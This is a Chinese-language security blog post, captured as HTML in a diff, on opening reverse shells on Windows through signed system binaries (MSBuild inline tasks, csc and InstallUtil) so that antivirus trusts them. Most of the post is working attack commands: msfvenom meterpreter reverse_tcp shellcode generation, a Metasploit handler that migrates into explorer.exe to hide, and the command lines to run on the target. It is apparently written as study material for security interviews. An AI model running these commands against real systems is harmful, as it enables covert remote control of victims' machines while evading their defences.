@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>windwos下反弹shell的方法 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">𝔸_𝕐𝕌ʹ𝕤 𝔹𝕀💿𝔾</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">windwos下反弹shell的方法</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-04-26&nbsp;&nbsp;8:15:52</a> &nbsp;
+                        </span>
+                    
+                    
+                    
+                    <span id="/2022/04/26/22-0426-01/" class="leancloud-visitors view" data-flag-title="windwos下反弹shell的方法">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>B站看whale3070师傅模拟面试题时，有个问题：除了用windows下自带的powershell，还有哪些姿势，下面来学习下windows下反弹shell的一些姿势</p>
+<p>文章内容主要参考：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5768#toc-9">https://xz.aliyun.com/t/5768#toc-9</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-MSBuild-To-Do-More">https://3gstudent.github.io/Use-MSBuild-To-Do-More</a><br><a target="_blank" rel="noopener" href="https://micro8.github.io/Micro8-HTML/Content/Contents.html">https://micro8.github.io/Micro8-HTML/Content/Contents.html</a></p>
+</blockquote>
+<h1 id="Windows白加黑"><a href="#Windows白加黑" class="headerlink" title="Windows白加黑"></a>Windows白加黑</h1><h2 id="什么是白加黑"><a href="#什么是白加黑" class="headerlink" title="什么是白加黑"></a>什么是白加黑</h2><p>所谓的“白加黑”，笼统来说是“白exe”加“黑dll”，“白exe”是指带有数字签名的正常exe文件，那么“黑dll”当然是指包含恶意代码的dll文件。病毒借助那些带数字签名且在杀毒软件白名单内的exe程序去加载自己带有恶意代码的dll，便能获得杀毒软件主动防御的自动信任，从而成功加载到系统中。</p>
+<h2 id="MSBulid"><a href="#MSBulid" class="headerlink" title="MSBulid"></a>MSBulid</h2><p>MSBuild 是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。调用MSBuild.exe可以在未安装Visual Studio的环境中编译*.csproj*文件，还可以编译特定格式的xml文件（当然csproj文件实际是一种特殊的Xml文件）</p>
+<ul>
+<li><p>NET是微软公司下的一个开发平台，一般指.Net Framework框架，一种技术，一种平台，包括.NET框架和.NET开发工具等。</p>
+</li>
+<li><p>C#运行在.NET平台上的，用于创建开发应用程序的一种高级编程语言</p>
+</li>
+<li><p>.NET开发环境中建立项目时，会产生 .csproj 文件，这是C#的工程文件，其中记录了与工程有关的相关信息，例如包含的文件，程序的版本，所生成的文件的类型和位置的信息等。</p>
+</li>
+<li><p>.cs文件是C#的源代码文件</p>
+</li>
+</ul>
+<p>新版csproj文件格式如下：</p>
+<img src="/2022/04/26/22-0426-01/1.png" class title="image-2">
+
+<p>旧版csproj文件格式如下：</p>
+<img src="/2022/04/26/22-0426-01/2.png" class title="image-2">
+
+
+
+<p>由于MSBulid没有加入到系统路径中，所以我们需要知道MSBulid.exe的路径，否则是无法进行执行的</p>
+<blockquote>
+<p>Win10中MSbulid的默认位置</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x64   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe</span><br><span class="line">x32   C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe</span><br></pre></td></tr></table></figure>
+
+<p>这里用time.txt做测试，目的是打印出当前的时间（注意：这里后缀名是.txt，而不是.xml或.csproj，因为只要文件的内容满足xml格式，后缀名是啥都无所谓，MSBuild.exe都可以编译）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;PrintCurrentDateTime&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Message</span> <span class="attr">Text</span>=<span class="string">&quot;The current date and time is: $(<span class="symbol">&amp;#91;</span>System.DateTime<span class="symbol">&amp;#93;</span>::Now).&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe来执行time.txt</p>
+<img src="/2022/04/26/22-0426-01/image-20220426203108510.png" class title="image-20220426203108510">
+
+<p>当然我们还可以编译.csproj文件把.cs文件变成.exe文件</p>
+<p>新建一个C#的源文件hello.cs，目的是控制台输出Hello world，内容如下：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在同目录下新建一个hello.csproj，该文件的功能就是把hello.cs编译成hello.exe，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;Compile&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CSC</span> <span class="attr">Sources</span>=<span class="string">&quot;hello.cs&quot;</span> <span class="attr">OutputAssembly</span>=<span class="string">&quot;hello.exe&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用MSBuild.exe编译hello.csproj</p>
+<img src="/2022/04/26/22-0426-01/image-20220426210156588.png" class title="image-20220426210156588">
+
+<p>然后我们执行hello.exe就会执行hello.cs中C#代码<code>Console.WriteLine(&quot;Hello world&quot;);</code>，输出Hello world</p>
+<img src="/2022/04/26/22-0426-01/image-20220426210326491.png" class title="image-20220426210326491">
+
+<p>上述思路就是通过MSBuild.exe编译XML格式的文件（hello.csproj）把C#源文件（hello.cs）变成exe文件</p>
+<p>基于类似的思路我们可以编写一个XML格式的文件，然后让其加载C#源文件</p>
+<p>如果我们把C#源文件中的代码变成恶意代码，然后写一个XML格式的文件来加载恶意的C#源代码</p>
+<h3 id="反弹shell方式"><a href="#反弹shell方式" class="headerlink" title="反弹shell方式"></a>反弹shell方式</h3><p>kali下msf生成C#的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.212 lport=6666 -f csharp</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/04/26/22-0426-01/image-20220426213251073.png" class title="image-20220426213251073">
+
+<p>然后我们把shellcode放到XML文件中即可，XML文件直接使用3gstudent师傅的，地址如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/msbuild-inline-task">https://github.com/3gstudent/msbuild-inline-task</a></p>
+<p>这里我们用<code>executes x64 shellcode.xml</code>，直接把里面的shellcode替换成自己的即可</p>
+<p>先在kali上监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.212</span><br><span class="line">set LPORT 6666</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set autorunscript migrate -n explorer.exe</span><br><span class="line">exploit -j   </span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">set ExitOnSession false ：避免接受多个session会话</span><br><span class="line">set autorunscript migrate -n explorer.exe ：为了避免恶意进程被发现，将恶意进程迁移到目表机器的explorer.exe(windwos资源管理器)中</span><br><span class="line">exploit -j ：攻击在后台执行</span><br></pre></td></tr></table></figure>
+
+<p>然后在目标机器上执行 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe    executes x64 shellcode.xml</span><br></pre></td></tr></table></figure>
+
+<p>目前已经无法免杀了，连火绒都拦截 </p>
+<img src="/2022/04/26/22-0426-01/image-20220426220356878.png" class title="image-20220426220356878">
+
+<h2 id="Installutil-exe-amp-csc-exe"><a href="#Installutil-exe-amp-csc-exe" class="headerlink" title="Installutil.exe&amp;csc.exe"></a>Installutil.exe&amp;csc.exe</h2><p>Installutil.exe是一个安装程序工具，我们可以使用Installutil.exe安装和卸载一些windwos的服务，Installutil.exe的路径也没有加入环境变量</p>
+<p>win10的默认位置为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X64  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</span><br><span class="line">X32  C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell方式-1"><a href="#反弹shell方式-1" class="headerlink" title="反弹shell方式"></a>反弹shell方式</h3><p>msf生成C#语言的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.212 lport=6666 -f csharp</span><br></pre></td></tr></table></figure>
+
+<p>下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260</a></p>
+<p>利用<code>csc</code>把D:\test\InstallUtil-ShellCode.cs路径下的InstallUtil-ShellCode.cs编译成InstallUtil-shell.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
+
+<p>当然我们也可以编译成InstallUtil-shell.dll、InstallUtil-shell.txt等多种格式，这里的后缀名是无所谓的</p>
+<p>然后用InstallUtil.exe执行<code>csc</code>编译后生成的文件，即可反弹shell到kali上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="后续更多姿势参考Micro8师傅博客"><a href="#后续更多姿势参考Micro8师傅博客" class="headerlink" title="后续更多姿势参考Micro8师傅博客"></a>后续更多姿势参考Micro8师傅博客</h2><p><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/71-80">https://micro8.gitbook.io/micro8/contents-1/71-80</a></p>
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF/">
+                            <i class="iconfont icon-tag1"></i>
+                            反弹shell姿势
+                        </a>
+                    
+                        <a href="/tags/%E7%99%BD%E5%8A%A0%E9%BB%91/">
+                            <i class="iconfont icon-tag1"></i>
+                            白加黑
+                        </a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/04/26/22-0426-02/">关于该博客</a>
+            
+            
+            <a class="next" rel="next" href="/2022/04/25/22-0425-01/">vulhub靶机—Os-hacknos-3</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
